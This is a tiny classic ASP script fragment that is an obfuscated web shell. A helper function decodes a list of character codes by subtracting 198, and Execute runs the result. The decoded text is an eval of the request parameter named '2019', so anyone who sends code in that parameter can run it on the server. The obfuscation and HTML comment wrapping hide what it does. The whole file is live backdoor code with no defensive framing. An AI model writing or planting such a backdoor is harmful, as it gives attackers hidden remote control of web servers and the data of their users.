<%
<!--
Function NRLM(RHAP):
	RHAP = Split(RHAP,"@")
	For x=0 To Ubound(RHAP)
		NRLM=NRLM&Chr(RHAP(x)-198)
	Next
End Function
EXecutE(NRLM("299@316@295@306@230@312@299@311@315@299@313@314@238@232@248@246@247@255@232@239"))
-->
%>